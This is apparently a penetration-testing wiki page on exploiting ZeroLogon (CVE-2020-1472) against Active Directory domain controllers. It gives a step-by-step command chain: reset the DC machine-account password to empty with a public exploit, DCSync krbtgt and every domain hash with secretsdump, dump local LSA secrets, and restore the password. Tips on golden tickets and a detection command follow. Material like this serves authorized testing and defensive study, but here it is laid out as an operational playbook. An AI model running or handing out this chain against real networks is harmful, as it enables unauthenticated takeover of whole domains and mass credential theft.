---
title: "ZeroLogon: resetting the domain controller account over Netlogon"
description: "Exploiting the Netlogon cryptographic flaw to authenticate to a domain controller as its own machine account without credentials and reset that account's password to empty, then dumping the domain and restoring the password to avoid breaking the DC."
keywords:
  - ZeroLogon
  - Netlogon
  - NetrServerPasswordSet2
  - DC machine account
  - domain takeover
---

# ZeroLogon

ZeroLogon is a flaw in the **Netlogon** secure-channel protocol (MS-NRPC): its session setup uses AES-CFB8 with an **all-zero IV**, so an unauthenticated attacker who sends all-zero challenge data has a high chance of establishing a "valid" Netlogon session as **any machine account**, including a **domain controller's**. From there, `NetrServerPasswordSet2` resets that DC's machine-account password **in the directory** to empty, handing you the DC's identity and, through it, the whole domain. It is unauthenticated, remote, and needs only network access to a DC.

## The attack

```bash
# 1. Reset the target DC's machine-account password in AD to empty
#    (the public exploit sets DC$'s AD password to an empty string)
cve-2020-1472-exploit.py <DC-netbios-name> <dc-ip>

# 2. DCSync as the DC machine account (now empty) to recover a Domain Admin hash
secretsdump.py -just-dc -no-pass 'EXAMPLE/DC01$@<dc-ip>'
# -> krbtgt and every domain hash, including a Domain Admin NT hash
```

```bash
# NetExec only DETECTS the flaw (reports VULNERABLE); it does not perform the reset
nxc smb <dc> -u '' -p '' -M zerologon
```

## Restore the password, or you break the domain

The reset changes the password **in AD only**; the DC still has its original password in its local registry (`$MACHINE.ACC` / LSA secrets), so the two now disagree. Left like that, the DC cannot authenticate and the domain breaks. The DCSync above reads **AD**, where the password is already empty, so it does **not** give you the original value. Recover it from the DC's **local** secrets, then set it back:

```bash
# 3. With the recovered Domain Admin hash, dump the DC's LOCAL secrets
#    (the local registry still holds the original machine password)
secretsdump.py 'EXAMPLE/Administrator@<dc-ip>' -hashes :<domain-admin-nt-hash>
#    -> read plain_password_hex ($MACHINE.ACC) from the local LSA secrets output

# 4. Restore the original password (restorepassword.py appends the trailing $ itself,
#    so the account name is DC01, not DC01$)
restorepassword.py 'EXAMPLE/DC01@<DC-netbios>' -target-ip <dc-ip> -hexpass <plain_password_hex>
```

## Exploitation notes

- The payoff is immediate **domain compromise** with no credentials, which is why ZeroLogon was so severe; a patched DC enforces secure RPC and rejects the all-zero session.
- **Always restore**: skipping the restore locks the DC out of the domain and is both destructive and a loud failure. The original value comes from the DC's **local** secrets dump (step 3), not the AD DCSync, so recover it before you need it.
- dirkjanm's variant **relays** the Netlogon authentication instead of resetting the password, avoiding the destructive reset entirely, prefer it where available to stay non-destructive.
- After dumping, use the recovered [NTDS](ntds-and-dcsync.md) hashes (krbtgt for golden tickets, admins for direct access) rather than relying on the empty DC password, which you will have restored.

## Tools

- **cve-2020-1472 exploit / zerologon_tester** (SecuraBV, dirkjanm): check and set the empty password.
- **Impacket** (`secretsdump.py -no-pass`, `restorepassword.py`): DCSync as DC$ and restore the password.
- **NetExec `-M zerologon`**: detect the flaw (reports vulnerable; does not reset the password).

## References

- [The Hacker Recipes: ZeroLogon](https://www.thehacker.recipes/ad/movement/netlogon/zerologon)
- [dirkjanm: a different way of abusing ZeroLogon](https://dirkjanm.io/a-different-way-of-abusing-zerologon/)
- [Semperis: ZeroLogon explained](https://www.semperis.com/blog/zerologon-explained/)
